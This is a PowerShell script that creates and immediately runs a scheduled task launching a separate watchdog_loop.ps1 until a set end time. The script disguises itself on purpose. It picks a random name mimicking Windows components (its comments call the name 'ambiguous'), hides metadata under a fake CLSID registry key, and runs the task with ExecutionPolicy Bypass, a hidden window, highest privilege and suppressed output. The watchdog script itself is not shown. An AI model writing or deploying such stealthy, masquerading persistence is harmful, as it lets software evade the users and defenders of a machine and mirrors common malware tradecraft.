param (
    [Parameter(Mandatory = $true)]
    [int]$Minutes
)

# ============================================================
# 1. Generate a human-readable but ambiguous task name
# ============================================================

$subsystems = @(
    "Windows", "Win32", "Shell", "UserSession", "AppX", "Runtime"
)

$components = @(
    "Experience", "Telemetry", "Broker", "Cache", "Component", "Host"
)

$actions = @(
    "Update", "Sync", "Maintenance", "Refresh", "Coordinator"
)

$qualifiers = @(
    "Task", "Manager", "Service", "Handler"
)

$taskName = (
    (Get-Random $subsystems) +
    (Get-Random $components) +
    (Get-Random $actions) +
    (Get-Random $qualifiers)
)

# ============================================================
# 2. Persist task metadata quietly (no console output)
# ============================================================

$regBase = "HKCU:\Software\Classes\CLSID\$taskName"
New-Item -Path $regBase -Force | Out-Null

Set-ItemProperty -Path $regBase -Name "TaskName" -Value $taskName

$endTime = (Get-Date).AddMinutes($Minutes).ToString("yyyy-MM-ddTHH:mm:ss")
Set-ItemProperty -Path $regBase -Name "EndTime" -Value $endTime

# ============================================================
# 3. Resolve watchdog script (same directory)
# ============================================================

$baseDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$watchdog = Join-Path $baseDir "watchdog_loop.ps1"

$currentUser = "$env:USERDOMAIN\$env:USERNAME"

# ============================================================
# 4. Create scheduled task (runs in user session, highest priv)
# ============================================================

schtasks /create /f `
    /sc once `
    /st 23:59 `
    /tn $taskName `
    /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdog`" -EndTime `"$endTime`"" `
    /ru "$currentUser" `
    /rl highest `
    > $null 2>&1

# ============================================================
# 5. Start task immediately
# ============================================================

schtasks /run /tn $taskName > $null 2>&1
